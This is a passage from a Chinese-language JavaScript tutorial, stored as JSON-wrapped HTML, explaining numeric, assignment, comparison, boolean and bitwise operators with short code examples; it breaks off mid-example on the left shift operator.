class='header-anchor'>#</a>\n            <span>数值运算符，负数值运算符</span>\n        </h2>\n    <p>数值运算符（<code>+</code>）同样使用加号，但它是一元运算符（只需要一个操作数），而加法运算符是二元运算符（需要两个操作数）。</p>\n<p>数值运算符的作用在于可以将任何值转为数值（与<code>Number</code>函数的作用相同）。</p>\n<pre class=\"prettyprint language-javascript\"><code>+true // 1\n+[] // 0\n+{} // NaN</code></pre><p>上面代码表示，非数值经过数值运算符以后，都变成了数值（最后一行<code>NaN</code>也是数值）。具体的类型转换规则，参见《数据类型转换》一章。</p>\n<p>负数值运算符（<code>-</code>），也同样具有将一个值转为数值的功能，只不过得到的值正负相反。连用两个负数值运算符，等同于数值运算符。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = 1;\n-x // -1\n-(-x) // 1</code></pre><p>上面代码最后一行的圆括号不可少，否则会变成自减运算符。</p>\n<p>数值运算符号和负数值运算符，都会返回一个新的值，而不会改变原始变量的值。</p>\n\n        <h2>\n            <a href='#指数运算符' class='header-anchor'>#</a>\n            <span>指数运算符</span>\n        </h2>\n    <p>指数运算符（<code>**</code>）完成指数运算，前一个运算子是底数，后一个运算子是指数。</p>\n<pre class=\"prettyprint language-javascript\"><code>2 ** 4 // 16</code></pre>\n        <h2>\n            <a href='#赋值运算符' class='header-anchor'>#</a>\n            <span>赋值运算符</span>\n        </h2>\n    <p>赋值运算符（Assignment Operators）用于给变量赋值。</p>\n<p>最常见的赋值运算符，当然就是等号（<code>=</code>）。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 将 1 赋值给变量 x\nvar x = 1;\n\n// 将变量 y 的值赋值给变量 x\nvar x = y;</code></pre><p>赋值运算符还可以与其他运算符结合，形成变体。下面是与算术运算符的结合。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 等同于 x = x + y\nx += y\n\n// 等同于 x = x - y\nx -= y\n\n// 等同于 x = x * y\nx *= y\n\n// 等同于 x = x / y\nx /= y\n\n// 等同于 x = x % y\nx %= y\n\n// 等同于 x = x ** y\nx **= y</code></pre><p>下面是与位运算符的结合（关于位运算符，请见后文的介绍）。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 等同于 x = x &gt;&gt; y\nx &gt;&gt;= y\n\n// 等同于 x = x &lt;&lt; y\nx &lt;&lt;= y\n\n// 等同于 x = x &gt;&gt;&gt; y\nx &gt;&gt;&gt;= y\n\n// 等同于 x = x &amp; y\nx &amp;= y\n\n// 等同于 x = x | y\nx |= y\n\n// 等同于 x = x ^ y\nx ^= y</code></pre><p>这些复合的赋值运算符，都是先进行指定运算，然后将得到值返回给左边的变量。</p>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"运算符","link":"javascript:void(0)"},{"title":"比较运算符","link":"/operators/comparison.html"}],"content":"\n        <h1>\n            <a href='#比较运算符' class='header-anchor'>#</a>\n            <span>比较运算符</span>\n        </h1>\n    \n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    <p>比较运算符用于比较两个值的大小，然后返回一个布尔值，表示是否满足指定的条件。</p>\n<pre class=\"prettyprint language-javascript\"><code>2 &gt; 1 // true</code></pre><p>上面代码比较<code>2</code>是否大于<code>1</code>，返回<code>true</code>。</p>\n<blockquote>\n<p>注意，比较运算符可以比较各种类型的值，不仅仅是数值。</p>\n</blockquote>\n<p>JavaScript 一共提供了8个比较运算符。</p>\n<ul>\n<li><code>&gt;</code> 大于运算符</li>\n<li><code>&lt;</code> 小于运算符</li>\n<li><code>&lt;=</code> 小于或等于运算符</li>\n<li><code>&gt;=</code> 大于或等于运算符</li>\n<li><code>==</code> 相等运算符</li>\n<li><code>===</code> 严格相等运算符</li>\n<li><code>!=</code> 不相等运算符</li>\n<li><code>!==</code> 严格不相等运算符</li>\n</ul>\n<p>这八个比较运算符分成两类：相等比较和非相等比较。两者的规则是不一样的，对于非相等的比较，算法是先看两个运算子是否都是字符串，如果是的，就按照字典顺序比较（实际上是比较 Unicode 码点）；否则，将两个运算子都转成数值，再比较数值的大小。</p>\n\n        <h2>\n            <a href='#非相等运算符：字符串的比较' class='header-anchor'>#</a>\n            <span>非相等运算符：字符串的比较</span>\n        </h2>\n    <p>字符串按照字典顺序进行比较。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;cat&#039; &gt; &#039;dog&#039; // false\n&#039;cat&#039; &gt; &#039;catalog&#039; // false</code></pre><p>JavaScript 引擎内部首先比较首字符的 Unicode 码点。如果相等，再比较第二个字符的 Unicode 码点，以此类推。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;cat&#039; &gt; &#039;Cat&#039; // true&#039;</code></pre><p>上面代码中，小写的<code>c</code>的 Unicode 码点（<code>99</code>）大于大写的<code>C</code>的 Unicode 码点（<code>67</code>），所以返回<code>true</code>。</p>\n<p>由于所有字符都有 Unicode 码点，因此汉字也可以比较。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;大&#039; &gt; &#039;小&#039; // false</code></pre><p>上面代码中，“大”的 Unicode 码点是22823，“小”是23567，因此返回<code>false</code>。</p>\n\n        <h2>\n            <a href='#非相等运算符：非字符串的比较' class='header-anchor'>#</a>\n            <span>非相等运算符：非字符串的比较</span>\n        </h2>\n    <p>如果两个运算子都不是字符串，分成以下三种情况。</p>\n<p><strong>（1）原始类型值</strong></p>\n<p>如果两个运算子都是原始类型的值，则是先转成数值再比较。</p>\n<pre class=\"prettyprint language-javascript\"><code>5 &gt; &#039;4&#039; // true\n// 等同于 5 &gt; Number(&#039;4&#039;)\n// 即 5 &gt; 4\n\ntrue &gt; false // true\n// 等同于 Number(true) &gt; Number(false)\n// 即 1 &gt; 0\n\n2 &gt; true // true\n// 等同于 2 &gt; Number(true)\n// 即 2 &gt; 1</code></pre><p>上面代码中，字符串和布尔值都会先转成数值，再进行比较。</p>\n<p>任何值（包括<code>NaN</code>本身）与<code>NaN</code>比较，返回的都是<code>false</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>1 &gt; NaN // false\n1 &lt;= NaN // false\n&#039;1&#039; &gt; NaN // false\n&#039;1&#039; &lt;= NaN // false\nNaN &gt; NaN // false\nNaN &lt;= NaN // false</code></pre><p><strong>（2）对象</strong></p>\n<p>如果运算子是对象，会转为原始类型的值，再进行比较。</p>\n<p>对象转换成原始类型的值，算法是先调用<code>valueOf</code>方法；如果返回的还是对象，再接着调用<code>toString</code>方法，详细解释参见《数据类型的转换》一章。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = [2];\nx &gt; &#039;11&#039; // true\n// 等同于 [2].valueOf().toString() &gt; &#039;11&#039;\n// 即 &#039;2&#039; &gt; &#039;11&#039;\n\nx.valueOf = function () { return &#039;1&#039; };\nx &gt; &#039;11&#039; // false\n// 等同于 [2].valueOf() &gt; &#039;11&#039;\n// 即 &#039;1&#039; &gt; &#039;11&#039;</code></pre><p>两个对象之间的比较也是如此。</p>\n<pre class=\"prettyprint language-javascript\"><code>[2] &gt; [1] // true\n// 等同于 [2].valueOf().toString() &gt; [1].valueOf().toString()\n// 即 &#039;2&#039; &gt; &#039;1&#039;\n\n[2] &gt; [11] // true\n// 等同于 [2].valueOf().toString() &gt; [11].valueOf().toString()\n// 即 &#039;2&#039; &gt; &#039;11&#039;\n\n{ x: 2 } &gt;= { x: 1 } // true\n// 等同于 { x: 2 }.valueOf().toString() &gt;= { x: 1 }.valueOf().toString()\n// 即 &#039;[object Object]&#039; &gt;= &#039;[object Object]&#039;</code></pre>\n        <h2>\n            <a href='#严格相等运算符' class='header-anchor'>#</a>\n            <span>严格相等运算符</span>\n        </h2>\n    <p>JavaScript 提供两种相等运算符：<code>==</code>和<code>===</code>。</p>\n<p>简单说，它们的区别是相等运算符（<code>==</code>）比较两个值是否相等，严格相等运算符（<code>===</code>）比较它们是否为“同一个值”。如果两个值不是同一类型，严格相等运算符（<code>===</code>）直接返回<code>false</code>，而相等运算符（<code>==</code>）会将它们转换成同一个类型，再用严格相等运算符进行比较。</p>\n<p>本节介绍严格相等运算符的算法。</p>\n<p><strong>（1）不同类型的值</strong></p>\n<p>如果两个值的类型不同，直接返回<code>false</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>1 === &quot;1&quot; // false\ntrue === &quot;true&quot; // false</code></pre><p>上面代码比较数值的<code>1</code>与字符串的“1”、布尔值的<code>true</code>与字符串<code>&quot;true&quot;</code>，因为类型不同，结果都是<code>false</code>。</p>\n<p><strong>（2）同一类的原始类型值</strong></p>\n<p>同一类型的原始类型的值（数值、字符串、布尔值）比较时，值相同就返回<code>true</code>，值不同就返回<code>false</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>1 === 0x1 // true</code></pre><p>上面代码比较十进制的<code>1</code>与十六进制的<code>1</code>，因为类型和值都相同，返回<code>true</code>。</p>\n<p>需要注意的是，<code>NaN</code>与任何值都不相等（包括自身）。另外，正<code>0</code>等于负<code>0</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>NaN === NaN  // false\n+0 === -0 // true</code></pre><p><strong>（3）复合类型值</strong></p>\n<p>两个复合类型（对象、数组、函数）的数据比较时，不是比较它们的值是否相等，而是比较它们是否指向同一个地址。</p>\n<pre class=\"prettyprint language-javascript\"><code>{} === {} // false\n[] === [] // false\n(function () {} === function () {}) // false</code></pre><p>上面代码分别比较两个空对象、两个空数组、两个空函数，结果都是不相等。原因是对于复合类型的值，严格相等运算比较的是，它们是否引用同一个内存地址，而运算符两边的空对象、空数组、空函数的值，都存放在不同的内存地址，结果当然是<code>false</code>。</p>\n<p>如果两个变量引用同一个对象，则它们相等。</p>\n<pre class=\"prettyprint language-javascript\"><code>var v1 = {};\nvar v2 = v1;\nv1 === v2 // true</code></pre><p>注意，对于两个对象的比较，严格相等运算符比较的是地址，而大于或小于运算符比较的是值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj1 = {};\nvar obj2 = {};\n\nobj1 &gt; obj2 // false\nobj1 &lt; obj2 // false\nobj1 === obj2 // false</code></pre><p>上面的三个比较，前两个比较的是值，最后一个比较的是地址，所以都返回<code>false</code>。</p>\n<p><strong>（4）undefined 和 null</strong></p>\n<p><code>undefined</code>和<code>null</code>与自身严格相等。</p>\n<pre class=\"prettyprint language-javascript\"><code>undefined === undefined // true\nnull === null // true</code></pre><p>由于变量声明后默认值是<code>undefined</code>，因此两个只声明未赋值的变量是相等的。</p>\n<pre class=\"prettyprint language-javascript\"><code>var v1;\nvar v2;\nv1 === v2 // true</code></pre>\n        <h2>\n            <a href='#严格不相等运算符' class='header-anchor'>#</a>\n            <span>严格不相等运算符</span>\n        </h2>\n    <p>严格相等运算符有一个对应的“严格不相等运算符”（<code>!==</code>），它的算法就是先求严格相等运算符的结果，然后返回相反值。</p>\n<pre class=\"prettyprint language-javascript\"><code>1 !== &#039;1&#039; // true\n// 等同于\n!(1 === &#039;1&#039;)</code></pre><p>上面代码中，感叹号<code>!</code>是求出后面表达式的相反值。</p>\n\n        <h2>\n            <a href='#相等运算符' class='header-anchor'>#</a>\n            <span>相等运算符</span>\n        </h2>\n    <p>相等运算符用来比较相同类型的数据时，与严格相等运算符完全一样。</p>\n<pre class=\"prettyprint language-javascript\"><code>1 == 1.0\n// 等同于\n1 === 1.0</code></pre><p>比较不同类型的数据时，相等运算符会先将数据进行类型转换，然后再用严格相等运算符比较。类型转换规则如下。</p>\n<p><strong>（1）原始类型值</strong></p>\n<p>原始类型的值会转换成数值再进行比较。</p>\n<pre class=\"prettyprint language-javascript\"><code>1 == true // true\n// 等同于 1 === Number(true)\n\n0 == false // true\n// 等同于 0 === Number(false)\n\n2 == true // false\n// 等同于 2 === Number(true)\n\n2 == false // false\n// 等同于 2 === Number(false)\n\n&#039;true&#039; == true // false\n// 等同于 Number(&#039;true&#039;) === Number(true)\n// 等同于 NaN === 1\n\n&#039;&#039; == 0 // true\n// 等同于 Number(&#039;&#039;) === 0\n// 等同于 0 === 0\n\n&#039;&#039; == false  // true\n// 等同于 Number(&#039;&#039;) === Number(false)\n// 等同于 0 === 0\n\n&#039;1&#039; == true  // true\n// 等同于 Number(&#039;1&#039;) === Number(true)\n// 等同于 1 === 1\n\n&#039;\\n  123  \\t&#039; == 123 // true\n// 因为字符串转为数字时，省略前置和后置的空格</code></pre><p>上面代码将字符串和布尔值都转为数值，然后再进行比较。具体的字符串与布尔值的类型转换规则，参见《数据类型转换》一章。</p>\n<p><strong>（2）对象与原始类型值比较</strong></p>\n<p>对象（这里指广义的对象，包括数组和函数）与原始类型的值比较时，对象转换成原始类型的值，再进行比较。</p>\n<pre class=\"prettyprint language-javascript\"><code>[1] == 1 // true\n// 等同于 Number([1]) == 1\n\n[1] == &#039;1&#039; // true\n// 等同于 Number([1]) == Number(&#039;1&#039;)\n\n[1] == true // true\n// 等同于 Number([1]) == Number(true)</code></pre><p>上面代码中，数组<code>[1]</code>与数值进行比较，会先转成数值，再进行比较；与字符串进行比较，会先转成数值，再与字符串进行比较，然后字符串也会转成数值；与布尔值进行比较，两个运算子都会先转成数值，然后再进行比较。</p>\n<p><strong>（3）undefined 和 null</strong></p>\n<p><code>undefined</code>和<code>null</code>与其他类型的值比较时，结果都为<code>false</code>，它们互相比较时结果为<code>true</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>false == null // false\nfalse == undefined // false\n\n0 == null // false\n0 == undefined // false\n\nundefined == null // true</code></pre><p><strong>（4）相等运算符的缺点</strong></p>\n<p>相等运算符隐藏的类型转换，会带来一些违反直觉的结果。</p>\n<pre class=\"prettyprint language-javascript\"><code>0 == &#039;&#039;             // true\n0 == &#039;0&#039;            // true\n\n2 == true           // false\n2 == false          // false\n\nfalse == &#039;false&#039;    // false\nfalse == &#039;0&#039;        // true\n\nfalse == undefined  // false\nfalse == null       // false\nnull == undefined   // true\n\n&#039; \\t\\r\\n &#039; == 0     // true</code></pre><p>上面这些表达式都不同于直觉，很容易出错。因此建议不要使用相等运算符（<code>==</code>），最好只使用严格相等运算符（<code>===</code>）。</p>\n\n        <h2>\n            <a href='#不相等运算符' class='header-anchor'>#</a>\n            <span>不相等运算符</span>\n        </h2>\n    <p>相等运算符有一个对应的“不相等运算符”（<code>!=</code>），它的算法就是先求相等运算符的结果，然后返回相反值。</p>\n<pre class=\"prettyprint language-javascript\"><code>1 != &#039;1&#039; // false\n\n// 等同于\n!(1 == &#039;1&#039;)</code></pre>"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"运算符","link":"javascript:void(0)"},{"title":"布尔运算符","link":"/operators/boolean.html"}],"content":"\n        <h1>\n            <a href='#布尔运算符' class='header-anchor'>#</a>\n            <span>布尔运算符</span>\n        </h1>\n    \n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    <p>布尔运算符用于将表达式转为布尔值，一共包含四个运算符。</p>\n<ul>\n<li>取反运算符：<code>!</code></li>\n<li>且运算符：<code>&amp;&amp;</code></li>\n<li>或运算符：<code>||</code></li>\n<li>三元运算符：<code>?:</code></li>\n</ul>\n\n        <h2>\n            <a href='#取反运算符（!）' class='header-anchor'>#</a>\n            <span>取反运算符（!）</span>\n        </h2>\n    <p>取反运算符是一个感叹号，用于将布尔值变为相反值，即<code>true</code>变成<code>false</code>，<code>false</code>变成<code>true</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>!true // false\n!false // true</code></pre><p>对于非布尔值，取反运算符会将其转为布尔值。可以这样记忆，以下六个值取反后为<code>true</code>，其他值都为<code>false</code>。</p>\n<ul>\n<li><code>undefined</code></li>\n<li><code>null</code></li>\n<li><code>false</code></li>\n<li><code>0</code></li>\n<li><code>NaN</code></li>\n<li>空字符串（<code>&#39;&#39;</code>）</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>!undefined // true\n!null // true\n!0 // true\n!NaN // true\n!&quot;&quot; // true\n\n!54 // false\n!&#039;hello&#039; // false\n![] // false\n!{} // false</code></pre><p>上面代码中，不管什么类型的值，经过取反运算后，都变成了布尔值。</p>\n<p>如果对一个值连续做两次取反运算，等于将其转为对应的布尔值，与<code>Boolean</code>函数的作用相同。这是一种常用的类型转换的写法。</p>\n<pre class=\"prettyprint language-javascript\"><code>!!x\n// 等同于\nBoolean(x)</code></pre><p>上面代码中，不管<code>x</code>是什么类型的值，经过两次取反运算后，变成了与<code>Boolean</code>函数结果相同的布尔值。所以，两次取反就是将一个值转为布尔值的简便写法。</p>\n\n        <h2>\n            <a href='#且运算符（&&）' class='header-anchor'>#</a>\n            <span>且运算符（&amp;&amp;）</span>\n        </h2>\n    <p>且运算符（<code>&amp;&amp;</code>）往往用于多个表达式的求值。</p>\n<p>它的运算规则是：如果第一个运算子的布尔值为<code>true</code>，则返回第二个运算子的值（注意是值，不是布尔值）；如果第一个运算子的布尔值为<code>false</code>，则直接返回第一个运算子的值，且不再对第二个运算子求值。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;t&#039; &amp;&amp; &#039;&#039; // &quot;&quot;\n&#039;t&#039; &amp;&amp; &#039;f&#039; // &quot;f&quot;\n&#039;t&#039; &amp;&amp; (1 + 2) // 3\n&#039;&#039; &amp;&amp; &#039;f&#039; // &quot;&quot;\n&#039;&#039; &amp;&amp; &#039;&#039; // &quot;&quot;\n\nvar x = 1;\n(1 - 1) &amp;&amp; ( x += 1) // 0\nx // 1</code></pre><p>上面代码的最后一个例子，由于且运算符的第一个运算子的布尔值为<code>false</code>，则直接返回它的值<code>0</code>，而不再对第二个运算子求值，所以变量<code>x</code>的值没变。</p>\n<p>这种跳过第二个运算子的机制，被称为“短路”。有些程序员喜欢用它取代<code>if</code>结构，比如下面是一段<code>if</code>结构的代码，就可以用且运算符改写。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (i) {\n  doSomething();\n}\n\n// 等价于\n\ni &amp;&amp; doSomething();</code></pre><p>上面代码的两种写法是等价的，但是后一种不容易看出目的，也不容易除错，建议谨慎使用。</p>\n<p>且运算符可以多个连用，这时返回第一个布尔值为<code>false</code>的表达式的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>true &amp;&amp; &#039;foo&#039; &amp;&amp; &#039;&#039; &amp;&amp; 4 &amp;&amp; &#039;foo&#039; &amp;&amp; true\n// &#039;&#039;</code></pre><p>上面代码中，第一个布尔值为<code>false</code>的表达式为第三个表达式，所以得到一个空字符串。</p>\n\n        <h2>\n            <a href='#或运算符（||）' class='header-anchor'>#</a>\n            <span>或运算符（||）</span>\n        </h2>\n    <p>或运算符（<code>||</code>）也用于多个表达式的求值。它的运算规则是：如果第一个运算子的布尔值为<code>true</code>，则返回第一个运算子的值，且不再对第二个运算子求值；如果第一个运算子的布尔值为<code>false</code>，则返回第二个运算子的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;t&#039; || &#039;&#039; // &quot;t&quot;\n&#039;t&#039; || &#039;f&#039; // &quot;t&quot;\n&#039;&#039; || &#039;f&#039; // &quot;f&quot;\n&#039;&#039; || &#039;&#039; // &quot;&quot;</code></pre><p>短路规则对这个运算符也适用。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = 1;\ntrue || (x = 2) // true\nx // 1</code></pre><p>上面代码中，且运算符的第一个运算子为<code>true</code>，所以直接返回<code>true</code>，不再运行第二个运算子。所以，<code>x</code>的值没有改变。这种只通过第一个表达式的值，控制是否运行第二个表达式的机制，就称为“短路”（short-cut）。</p>\n<p>或运算符可以多个连用，这时返回第一个布尔值为<code>true</code>的表达式的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>false || 0 || &#039;&#039; || 4 || &#039;foo&#039; || true\n// 4</code></pre><p>上面代码中第一个布尔值为<code>true</code>的表达式是第四个表达式，所以得到数值4。</p>\n<p>或运算符常用于为一个变量设置默认值。</p>\n<pre class=\"prettyprint language-javascript\"><code>function saveText(text) {\n  text = text || &#039;&#039;;\n  // ...\n}\n\n// 或者写成\nsaveText(this.text || &#039;&#039;)</code></pre><p>上面代码表示，如果函数调用时，没有提供参数，则该参数默认设置为空字符串。</p>\n\n        <h2>\n            <a href='#三元条件运算符（?:）' class='header-anchor'>#</a>\n            <span>三元条件运算符（?:）</span>\n        </h2>\n    <p>三元条件运算符由问号（?）和冒号（:）组成，分隔三个表达式。它是 JavaScript 语言唯一一个需要三个运算子的运算符。如果第一个表达式的布尔值为<code>true</code>，则返回第二个表达式的值，否则返回第三个表达式的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;t&#039; ? &#039;hello&#039; : &#039;world&#039; // &quot;hello&quot;\n0 ? &#039;hello&#039; : &#039;world&#039; // &quot;world&quot;</code></pre><p>上面代码的<code>t</code>和<code>0</code>的布尔值分别为<code>true</code>和<code>false</code>，所以分别返回第二个和第三个表达式的值。</p>\n<p>通常来说，三元条件表达式与<code>if...else</code>语句具有同样表达效果，前者可以表达的，后者也能表达。但是两者具有一个重大差别，<code>if...else</code>是语句，没有返回值；三元条件表达式是表达式，具有返回值。所以，在需要返回值的场合，只能使用三元条件表达式，而不能使用<code>if..else</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.log(true ? &#039;T&#039; : &#039;F&#039;);</code></pre><p>上面代码中，<code>console.log</code>方法的参数必须是一个表达式，这时就只能使用三元条件表达式。如果要用<code>if...else</code>语句，就必须改变整个代码写法了。</p>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"运算符","link":"javascript:void(0)"},{"title":"二进制位运算符","link":"/operators/bit.html"}],"content":"\n        <h1>\n            <a href='#二进制位运算符' class='header-anchor'>#</a>\n            <span>二进制位运算符</span>\n        </h1>\n    \n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    <p>二进制位运算符用于直接对二进制位进行计算，一共有7个。</p>\n<ul>\n<li><strong>二进制或运算符</strong>（or）：符号为<code>|</code>，表示若两个二进制位都为<code>0</code>，则结果为<code>0</code>，否则为<code>1</code>。</li>\n<li><strong>二进制与运算符</strong>（and）：符号为<code>&amp;</code>，表示若两个二进制位都为1，则结果为1，否则为0。</li>\n<li><strong>二进制否运算符</strong>（not）：符号为<code>~</code>，表示对一个二进制位取反。</li>\n<li><strong>异或运算符</strong>（xor）：符号为<code>^</code>，表示若两个二进制位不相同，则结果为1，否则为0。</li>\n<li><strong>左移运算符</strong>（left shift）：符号为<code>&lt;&lt;</code>，详见下文解释。</li>\n<li><strong>右移运算符</strong>（right shift）：符号为<code>&gt;&gt;</code>，详见下文解释。</li>\n<li><strong>带符号位的右移运算符</strong>（zero filled right shift）：符号为<code>&gt;&gt;&gt;</code>，详见下文解释。</li>\n</ul>\n<p>这些位运算符直接处理每一个比特位（bit），所以是非常底层的运算，好处是速度极快，缺点是很不直观，许多场合不能使用它们，否则会使代码难以理解和查错。</p>\n<p>有一点需要特别注意，位运算符只对整数起作用，如果一个运算子不是整数，会自动转为整数后再执行。另外，虽然在 JavaScript 内部，数值都是以64位浮点数的形式储存，但是做位运算的时候，是以32位带符号的整数进行运算的，并且返回值也是一个32位带符号的整数。</p>\n<pre class=\"prettyprint language-javascript\"><code>i = i | 0;</code></pre><p>上面这行代码的意思，就是将<code>i</code>（不管是整数或小数）转为32位整数。</p>\n<p>利用这个特性，可以写出一个函数，将任意数值转为32位整数。</p>\n<pre class=\"prettyprint language-javascript\"><code>function toInt32(x) {\n  return x | 0;\n}</code></pre><p>上面这个函数将任意值与<code>0</code>进行一次或运算，这个位运算会自动将一个值转为32位整数。下面是这个函数的用法。</p>\n<pre class=\"prettyprint language-javascript\"><code>toInt32(1.001) // 1\ntoInt32(1.999) // 1\ntoInt32(1) // 1\ntoInt32(-1) // -1\ntoInt32(Math.pow(2, 32) + 1) // 1\ntoInt32(Math.pow(2, 32) - 1) // -1</code></pre><p>上面代码中，<code>toInt32</code>可以将小数转为整数。对于一般的整数，返回值不会有任何变化。对于大于2的32次方的整数，大于32位的数位都会被舍去。</p>\n\n        <h2>\n            <a href='#二进制或运算符' class='header-anchor'>#</a>\n            <span>二进制或运算符</span>\n        </h2>\n    <p>二进制或运算符（<code>|</code>）逐位比较两个运算子，两个二进制位之中只要有一个为<code>1</code>，就返回<code>1</code>，否则返回<code>0</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>0 | 3 // 3</code></pre><p>上面代码中，<code>0</code>和<code>3</code>的二进制形式分别是<code>00</code>和<code>11</code>，所以进行二进制或运算会得到<code>11</code>（即<code>3</code>）。</p>\n<p>位运算只对整数有效，遇到小数时，会将小数部分舍去，只保留整数部分。所以，将一个小数与<code>0</code>进行二进制或运算，等同于对该数去除小数部分，即取整数位。</p>\n<pre class=\"prettyprint language-javascript\"><code>2.9 | 0 // 2\n-2.9 | 0 // -2</code></pre><p>需要注意的是，这种取整方法不适用超过32位整数最大值<code>2147483647</code>的数。</p>\n<pre class=\"prettyprint language-javascript\"><code>2147483649.4 | 0;\n// -2147483647</code></pre>\n        <h2>\n            <a href='#二进制与运算符' class='header-anchor'>#</a>\n            <span>二进制与运算符</span>\n        </h2>\n    <p>二进制与运算符（<code>&amp;</code>）的规则是逐位比较两个运算子，两个二进制位之中只要有一个位为<code>0</code>，就返回<code>0</code>，否则返回<code>1</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>0 &amp; 3 // 0</code></pre><p>上面代码中，0（二进制<code>00</code>）和3（二进制<code>11</code>）进行二进制与运算会得到<code>00</code>（即<code>0</code>）。</p>\n\n        <h2>\n            <a href='#二进制否运算符' class='header-anchor'>#</a>\n            <span>二进制否运算符</span>\n        </h2>\n    <p>二进制否运算符（<code>~</code>）将每个二进制位都变为相反值（<code>0</code>变为<code>1</code>，<code>1</code>变为<code>0</code>）。它的返回结果有时比较难理解，因为涉及到计算机内部的数值表示机制。</p>\n<pre class=\"prettyprint language-javascript\"><code>~ 3 // -4</code></pre><p>上面表达式对<code>3</code>进行二进制否运算，得到<code>-4</code>。之所以会有这样的结果，是因为位运算时，JavaScirpt 内部将所有的运算子都转为32位的二进制整数再进行运算。</p>\n<p><code>3</code>的32位整数形式是<code>00000000000000000000000000000011</code>，二进制否运算以后得到<code>11111111111111111111111111111100</code>。由于第一位（符号位）是1，所以这个数是一个负数。JavaScript 内部采用补码形式表示负数，即需要将这个数减去1，再取一次反，然后加上负号，才能得到这个负数对应的10进制值。这个数减去1等于<code>11111111111111111111111111111011</code>，再取一次反得到<code>00000000000000000000000000000100</code>，再加上负号就是<code>-4</code>。考虑到这样的过程比较麻烦，可以简单记忆成，一个数与自身的取反值相加，等于-1。</p>\n<pre class=\"prettyprint language-javascript\"><code>~ -3 // 2</code></pre><p>上面表达式可以这样算，<code>-3</code>的取反值等于<code>-1</code>减去<code>-3</code>，结果为<code>2</code>。</p>\n<p>对一个整数连续两次二进制否运算，得到它自身。</p>\n<pre class=\"prettyprint language-javascript\"><code>~~3 // 3</code></pre><p>所有的位运算都只对整数有效。二进制否运算遇到小数时，也会将小数部分舍去，只保留整数部分。所以，对一个小数连续进行两次二进制否运算，能达到取整效果。</p>\n<pre class=\"prettyprint language-javascript\"><code>~~2.9 // 2\n~~47.11 // 47\n~~1.9999 // 1\n~~3 // 3</code></pre><p>使用二进制否运算取整，是所有取整方法中最快的一种。</p>\n<p>对字符串进行二进制否运算，JavaScript 引擎会先调用<code>Number</code>函数，将字符串转为数值。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 相当于~Number(&#039;011&#039;)\n~&#039;011&#039;  // -12\n\n// 相当于~Number(&#039;42 cats&#039;)\n~&#039;42 cats&#039; // -1\n\n// 相当于~Number(&#039;0xcafebabe&#039;)\n~&#039;0xcafebabe&#039; // 889275713\n\n// 相当于~Number(&#039;deadbeef&#039;)\n~&#039;deadbeef&#039; // -1</code></pre><p><code>Number</code>函数将字符串转为数值的规则，参见《数据的类型转换》一章。</p>\n<p>对于其他类型的值，二进制否运算也是先用<code>Number</code>转为数值，然后再进行处理。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 相当于 ~Number([])\n~[] // -1\n\n// 相当于 ~Number(NaN)\n~NaN // -1\n\n// 相当于 ~Number(null)\n~null // -1</code></pre>\n        <h2>\n            <a href='#异或运算符' class='header-anchor'>#</a>\n            <span>异或运算符</span>\n        </h2>\n    <p>异或运算（<code>^</code>）在两个二进制位不同时返回<code>1</code>，相同时返回<code>0</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>0 ^ 3 // 3</code></pre><p>上面表达式中，<code>0</code>（二进制<code>00</code>）与<code>3</code>（二进制<code>11</code>）进行异或运算，它们每一个二进制位都不同，所以得到<code>11</code>（即<code>3</code>）。</p>\n<p>“异或运算”有一个特殊运用，连续对两个数<code>a</code>和<code>b</code>进行三次异或运算，<code>a^=b; b^=a; a^=b;</code>，可以<a href=\"http://en.wikipedia.org/wiki/XOR_swap_algorithm\">互换</a>它们的值。这意味着，使用“异或运算”可以在不引入临时变量的前提下，互换两个变量的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = 10;\nvar b = 99;\n\na ^= b, b ^= a, a ^= b;\n\na // 99\nb // 10</code></pre><p>这是互换两个变量的值的最快方法。</p>\n<p>异或运算也可以用来取整。</p>\n<pre class=\"prettyprint language-javascript\"><code>12.9 ^ 0 // 12</code></pre>\n        <h2>\n            <a href='#左移运算符' class='header-anchor'>#</a>\n            <span>左移运算符</span>\n        </h2>\n    <p>左移运算符（<code>&lt;&lt;</code>）表示将一个数的二进制值向左移动指定的位数，尾部补<code>0</code>，即乘以<code>2</code>的指定次方。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 4 的二进制形式为100，\n// 左移一位为1000（即十进制的8）\n// 相当于乘以2的1次方\n4 &lt;&lt; 1\n// 8\n\n-4 &lt;&lt; 1\n// 